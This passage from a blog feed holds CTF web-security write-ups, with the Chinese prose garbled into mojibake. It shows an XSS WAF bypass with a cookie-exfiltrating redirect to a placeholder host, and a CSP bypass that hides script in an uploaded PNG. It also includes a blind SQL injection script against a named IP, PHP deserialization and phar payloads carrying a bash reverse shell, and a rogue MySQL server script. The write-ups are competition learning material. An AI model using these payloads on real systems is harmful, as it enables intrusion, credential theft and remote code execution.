<p>è¿™ä¸€å±‚wafï¼Œå…¶å®åªè¦æ‘¸æ¸…bançš„å¥—è·¯ï¼Œé’ˆå¯¹æ€§æ‰¾åˆ°æ²¡è¢«å¤„ç†çš„è¯­æ³•æ¥ç»•è¿‡å³å¯ï¼Œè¿™é‡Œæˆ‘çš„é¢„æœŸè§£æ˜¯ç”¨throwä¼ é€’å˜é‡ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šå…¶ä»–èƒ½ç”¨çš„è¯­æ³•ï¼ˆäº‹å®è¯æ˜ç¡®å®æœ‰å¾ˆå¤š</p>
<p>é¢„æœŸè§£payloadï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=base64code<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></span><br></pre></td></tr></table></figure>
<p>ç»•è¿‡WAFçš„ä¸¤å±‚é˜²æŠ¤ä¹‹åæœ¬åœ°èƒ½æˆåŠŸalertå°±å¯ä»¥ç”¨</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</span><br></pre></td></tr></table></figure>
<p>æ‰“åˆ°ç®¡ç†å‘˜cookieäº†ï¼Œcookieä¸­åŒ…å«ä¸€åŠçš„flagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#x3D;De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure>
<h2 id="ç¬¬äºŒå…³ï¼šè¯»å–400å¼ å›¾ç‰‡"><a href="#ç¬¬äºŒå…³ï¼šè¯»å–400å¼ å›¾ç‰‡" class="headerlink" title="ç¬¬äºŒå…³ï¼šè¯»å–400å¼ å›¾ç‰‡"></a>ç¬¬äºŒå…³ï¼šè¯»å–400å¼ å›¾ç‰‡</h2><p>å¦å¤–ä¸€åŠflagï¼Œé¢˜ç›®ç»™äº†hintï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç®¡ç†å‘˜åœ¨åšä»€ä¹ˆ?</span><br></pre></td></tr></table></figure>
<p>è¯»å–ç®¡ç†å‘˜çš„documentï¼Œä¼šå‘ç°æœ‰400å¤šå¼ pngå›¾ç‰‡ï¼Œflagå°±è—åœ¨è¿™äº›å›¾ç‰‡å½“ä¸­ï¼Œè¿™é‡Œè®¾è®¡çš„æ—¶å€™é¢„è®¾äº†ä¸‹é¢å‡ ç§è§£æ³•ï¼š</p>
<ol>
<li>ç»•è¿‡CSPå¼•å…¥æˆªå›¾åº“ï¼Œæˆªå›¾åæŠŠå›¾ç‰‡ä¼ åˆ°/uploadï¼Œè·å–å›¾ç‰‡åœ°å€å›ä¼ ï¼Œç„¶åä¸‹è½½å›¾ç‰‡</li>
<li>ç”¨forå¾ªç¯æŠŠ400ä¸ªå›¾å…¨éƒ¨ä¼ åˆ°/uploadï¼Œè·å–400ä¸ªå›¾ç‰‡åœ°å€ç„¶åå›ä¼ </li>
<li>ç›´æ¥è¯»å–å›¾ç‰‡å›ä¼ ï¼Œå¯ä»¥æ˜¯å†™è„šæœ¬ä¸€å¼ ä¸€å¼ ä¼ ï¼Œä¹Ÿå¯ä»¥æ˜¯ç”¨forå¾ªç¯æ‰¹é‡ä¼ ï¼Œä½†æ˜¯å›ä¼ è¿‡ç¨‹éœ€è¦ç¼–ç è½¬æ¢ï¼Œä¼ å›å»åä¹Ÿéœ€è¦å†è½¬æˆå›¾ç‰‡è¿›è¡Œæ‹¼æ¥</li>
</ol>
<p>ä¸‰ç§æ–¹æ³•æœ‰ç®€å•çš„ä¹Ÿæœ‰å¤æ‚çš„ï¼Œå›½å¤–ä¸‰æ”¯é˜Ÿä¼ç”¨çš„éƒ½æ˜¯ç¬¬ä¸‰ç§ï¼ŒæŠŠæ‰€æœ‰å›¾ç‰‡dumpå‡ºå»ï¼ˆæˆ‘çŒœå¤§ä½¬ä»¬æ²¡å‘ç°/uploadæ¥å£ 23333ï¼‰ï¼Œè€Œå›½å†…çš„é€‰æ‰‹ç”¨çš„æ˜¯è§£æ³•2ï¼Œä¸‹é¢æˆ‘è¯¦ç»†ä»‹ç»ä¸‹ç»•è¿‡CSPå¼•å…¥æˆªå›¾åº“çš„è§£æ³•ï¼Œå…¶ä»–çš„æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼ï¼Œå°±ä¸å…¨å†™å‡ºæ¥äº†ï¼ˆæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹è§£å‡ºæ¥çš„å¤§ä½¬ä»¬çš„wpï¼‰ã€‚</p>
<h3 id="ç»•è¿‡CSPå¼•å…¥æˆªå›¾åº“"><a href="#ç»•è¿‡CSPå¼•å…¥æˆªå›¾åº“" class="headerlink" title="ç»•è¿‡CSPå¼•å…¥æˆªå›¾åº“"></a>ç»•è¿‡CSPå¼•å…¥æˆªå›¾åº“</h3><p>æœ¬é¢˜çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ¶é€ åŠ¨æ£®æŠ¤ç…§ï¼Œä¸»é¡µæ˜¯æœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶æ¥å£çš„ï¼Œåˆ©ç”¨/uploadæ¥å£ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„pngåç¼€çš„æ–‡ä»¶ï¼Œç„¶åç”¨fetchè¯»è¿™ä¸ªpngæ–‡ä»¶ï¼Œå†evalä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡CSPå¼•å…¥html2canvasåº“å¹¶ä¸”æ‰§è¡Œäº†ï¼Œä¸Šä¼ çš„pngæ–‡ä»¶å¦‚ä¸‹</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">	...</span><br><span class="line">  ...</span><br><span class="line">html2canvas.jsä»£ç </span><br><span class="line">	...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆªå›¾-&gt;ä¸Šä¼ åˆ°upload-&gt;å¤–ä¼ å›¾ç‰‡åœ°å€</span></span><br><span class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</span><br><span class="line">        url = <span class="string">"/upload"</span>,</span><br><span class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</span><br><span class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</span><br><span class="line">        form.append(<span class="string">"file"</span>, file)</span><br><span class="line">        fetch(url, &#123;</span><br><span class="line">            method: <span class="string">"POST"</span>,</span><br><span class="line">            body: form</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘æŠŠæˆªå›¾æ“ä½œçš„jsä¹Ÿå†™åˆ°pngé‡Œäº†ï¼Œä¸»è¦æ€è·¯å°±æ˜¯æˆªå›¾å®Œç”¨/uploadä¼ åˆ°æœåŠ¡å™¨ï¼Œè·å–è¿”å›çš„å›¾ç‰‡åœ°å€å›ä¼ ç»™æ”»å‡»è€…</p>
<h3 id="è¯»å–å›¾ç‰‡å¹¶æ‰§è¡Œ"><a href="#è¯»å–å›¾ç‰‡å¹¶æ‰§è¡Œ" class="headerlink" title="è¯»å–å›¾ç‰‡å¹¶æ‰§è¡Œ"></a>è¯»å–å›¾ç‰‡å¹¶æ‰§è¡Œ</h3><p>æŠŠå›¾ç‰‡ç”¨/uploadæ¥å£ä¸Šä¼ åï¼Œè·å–pngåœ°å€ï¼Œå†ç”¨å¯æ§çš„jséƒ¨åˆ†å»è¯»å–è¿™ä¸ªå›¾ç‰‡å†æ‰§è¡Œå³å¯</p>
<p>è¯»å–å¹¶æ‰§è¡Œçš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</span><br></pre></td></tr></table></figure>
<p>ç”¨ç»•è¿‡ç¬¬ä¸€å…³çš„åŠæ³•åŒ…è£…ä¸€ä¸‹å°±å¯ä»¥äº†</p>
<p>æœ€åæäº¤åˆ°botå°±èƒ½æ¥æ”¶åˆ°ç®¡ç†å‘˜ç•Œé¢æˆªå›¾çš„åœ°å€äº†ï¼Œç›´æ¥ä¸‹è½½å°±èƒ½çœ‹åˆ°å¦ä¸€åŠflagäº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€åflagï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‡ºé¢˜æ„Ÿæƒ³"><a href="#å‡ºé¢˜æ„Ÿæƒ³" class="headerlink" title="å‡ºé¢˜æ„Ÿæƒ³"></a>å‡ºé¢˜æ„Ÿæƒ³</h2><p>å‡ºè¿™é“é¢˜çš„åŸå› æ˜¯å› ä¸ºæœ€è¿‘ä¸€æ®µæ—¶é—´å·¥ä½œä¸Šæ¥è§¦äº‘WAFæ¯”è¾ƒå¤šï¼Œè€Œå°è±¡ä¸­çš„xssé¢˜è¿˜æ²¡æœ‰é™æ€è¯­æ³•åˆ†æç›¸å…³çš„ï¼Œæœ¬ç€realworldçš„æƒ³æ³•å°±å¥—è¿›æ¥äº†ï¼Œè€Œç¬¬äºŒå…³ä¸€å¼€å§‹æ˜¯çœ‹åˆ°äº†PNGç»•è¿‡CSPé‚£ç¯‡æ–‡ç« ï¼Œä½†æ˜¯å‡ºé¢˜åˆ°åé¢å‘ç°æ²¡åŠ å›¾ç‰‡æ ¡éªŒï¼Œç®—äº†è¿˜æ˜¯ç®€å•ç‚¹å§23333ã€‚  </p>
<p>è¿™æ¬¡æ¯”èµ›ä¸€å…±4æ”¯é˜Ÿä¼è§£å‡ºè¿™é“é¢˜ï¼Œå…¶ä¸­3æ”¯å›½å¤–é˜Ÿä¼ï¼ˆè€å¤–è¿˜æ˜¯ğŸ‚ï¼‰ï¼Œä¸€æ”¯å›½å†…é˜Ÿä¼ï¼Œæ€»è€Œè¨€ä¹‹ï¼Œä¸ªäººå¯¹è¿™æ¬¡å‡ºçš„è¿™é“é¢˜è¿˜æ˜¯æ¯”è¾ƒæ»¡æ„çš„ï¼ŒçœŸçš„æ²‰ä¸‹å¿ƒå»ç ”ç©¶ç»•WAFã€å¤–ä¼ å›¾ç‰‡çš„äººä¹Ÿæ˜¯èƒ½å­¦åˆ°ä¸œè¥¿çš„ï¼Œè¿™å°±å¤Ÿå•¦ï¼</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ä¸€å¹´ä¸€åº¦çš„De1CTFåˆæ¥äº†ï¼Œè¿™æ¬¡å‡ºäº†é“ç®€å•XSSé¢˜ï¼Œä¸‹é¢æ˜¯å…·ä½“WriteUpã€‚&lt;br&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="XSS" scheme="https://www.codemonster.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>2020 é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›éƒ¨åˆ†WEB WriteUp</title>
    <link href="https://www.codemonster.cn/2020/03/09/2020-gxzyctf-writeup/"/>
    <id>https://www.codemonster.cn/2020/03/09/2020-gxzyctf-writeup/</id>
    <published>2020-03-09T12:42:59.000Z</published>
    <updated>2020-03-09T13:41:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™å‘¨æœ«é‡ä¸Šé«˜æ ¡æˆ˜â€œç–«â€èµ›ï¼Œæ‰“äº†ä¸¤å¤©ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„å’Œå‚ä¸åšçš„å‡ é“é¢˜<br><a id="more"></a></p>
<h2 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h2><p>ä¼ å…¥2020 å’ŒYéƒ½èƒ½æŸ¥å‡ºç»“æœï¼Œä¼ å…¥y20ï¼Œyyï¼Œ20yä¹Ÿå¯ä»¥ï¼Œ<br>çŒœæµ‹åç«¯å¯¹å‚æ•°åšäº†date()è½¬æ¢ï¼Œç”¨\å¯ä»¥ä½¿dateåçš„å­—ç¬¦ä¸²ä¸å˜ï¼Œäºæ˜¯æ„é€ ç›²æ³¨è„šæœ¬<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">se = requests.Session()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\t\a\b\l\e_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\t\a\b\l\e\s \w\h\e\r\e \t\a\b\l\e_\s\c\h\e\m\a=\d\a\t\a\b\a\s\e()),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\c\o\l\u\m\n_\n\a\m\e)%%20\f\r\o\m%%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\c\o\l\u\m\n\s%%20\w\h\e\r\e%%20\t\a\b\l\e_\n\a\m\e=%%27\a\d\m\i\n%%27),%d,1)))=%d%%23'</span></span><br><span class="line">pl = <span class="string">r'http://121.37.181.246:6333/?time=0%%27||(\a\s\c\i\i(\s\u\b\s\t\r((\s\e\l\e\c\t%%20\g\r\o\u\p_\c\o\n\c\a\t(\u\r\l)%%20\f\r\o\m%%20\a\d\m\i\n),%d,1)))=%d%%23'</span></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">Â Â Â Â Â Â Â  <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">33</span>,<span class="number">126</span>):</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  res = se.get(pl % (x,y))</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <span class="keyword">if</span> <span class="string">'Hello World --Brian Kernighan'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  text += chr(y)</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <span class="keyword">print</span> text</span><br><span class="line">Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â  <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>æ³¨å…¥å‡ºä¸€ä¸ªadminç”¨æˆ·<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è´¦å· admin</span><br><span class="line">å¯†ç Â 20200202goodluck</span><br><span class="line"><span class="attribute">URLï¼šhttp://121.37.181.246:6333/eGlhb2xldW5n/</span></span><br></pre></td></tr></table></figure><br>æœ‰ä¸ªè¯»æ–‡ä»¶çš„åœ°æ–¹ï¼Œé™åˆ¶äº†åªèƒ½æœ¬åœ°è¯»å–æ–‡ä»¶ï¼Œå‘ç°<code>file://localhost/</code>å¯ä»¥ç»•è¿‡<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/check.php?url=file://localhost/var/www/html/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php</span><br></pre></td></tr></table></figure><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		$str = <span class="string">""</span>;</span><br><span class="line">		 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">		 	$str = $str .chr($num);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr($number);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">		  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">		  	<span class="keyword">return</span> $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>æœ€åååºåˆ—åŒ–è¯»flag<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://121.37.181.246:6333/eGlhb2xldW5n/eGlhb2xldW5nLnBocA==.php?code=Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czoyMzoifsfJycrHzcvIy8nLycvIyM/IycnKyM4iO30=&amp;pass=a.passwd%0a20200202</span><br></pre></td></tr></table></figure></p>
<h2 id="webct"><a href="#webct" class="headerlink" title="webct"></a>webct</h2><p>æœ‰ä¸ªä¸Šä¼ æ–‡ä»¶çš„ç‚¹ï¼Œå’Œä¸€ä¸ªè¿æ¥mysqlæ•°æ®åº“çš„ç‚¹<br>mysqlæ•°æ®åº“ä¼ å…¥çš„optionå‚æ•°å¯æ§ï¼Œå°†å…¶è®¾ç½®ä¸º8å¯ä»¥å¼€å¯MYSQLI_OPT_LOCAL_INFILEã€‚<br>ä½†æ˜¯ç›´æ¥è¯»æ–‡ä»¶å¤±è´¥äº†ï¼Œæƒ³åˆ°æ„é€ pharæ–‡ä»¶è®©msyqlå»è¯»å–è§¦å‘ååºåˆ—åŒ–<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fileupload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Listfile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload=<span class="keyword">new</span> Listfile();</span><br><span class="line">$payload-&gt;file=<span class="string">'$(bash -c "bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1")'</span>;</span><br><span class="line">$file=<span class="keyword">new</span> Fileupload();</span><br><span class="line">$file-&gt;file=$payload;</span><br><span class="line">unlink(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"./phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($file);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($file));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>ä¸Šä¼ ä¹‹åç›´æ¥ç”¨MysqlRougeè§¦å‘ååºåˆ—åŒ–å³å¯ï¼Œ<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">coding=utf<span class="number">-8</span> </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">filename=<span class="string">"phar:////var/www/html/uploads/846c8ebb95a1fc1828e4fcc14a8902e0/b4bc4fd46f0e346f2bd105c93c5a1b20.jpg"</span></span><br><span class="line">sv=socket.socket()</span><br><span class="line">sv.bind((<span class="string">""</span>,<span class="number">3309</span>))</span><br><span class="line">sv.listen(<span class="number">5</span>)</span><br><span class="line">conn,address=sv.accept()</span><br><span class="line">logging.info(<span class="string">'Conn from: %r'</span>, address)</span><br><span class="line">conn.sendall(<span class="string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"auth okay"</span>)</span><br><span class="line">conn.sendall(<span class="string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span>)</span><br><span class="line">conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(<span class="string">"want file..."</span>)</span><br><span class="line">wantfile=chr(len(filename)+<span class="number">1</span>)+<span class="string">"\x00\x00\x01\xFB"</span>+filename</span><br><span class="line">conn.sendall(wantfile)</span><br><span class="line">content=conn.recv(<span class="number">9999</span>)</span><br><span class="line">logging.info(content)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure></p>
<p>payloadï¼š<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=ip:port&amp;user=user&amp;password=passsword&amp;option=8</span><br></pre></td></tr></table></figure></p>
<p>æœ€å/readflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagï¼šflag&#123;bfa7ea9865f08c320abab5323a1b522c1&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h2><p>å®¡è®¡ä»£ç å‘ç°å¯ä»¥æ„é€ SSRF<br><a href="http://121.37.179.47:1101/?head=\&amp;url=xxx.xxx.xxx.xxx" target="_blank" rel="noopener">http://121.37.179.47:1101/?head=\&amp;url=xxx.xxx.xxx.xxx</a></p>
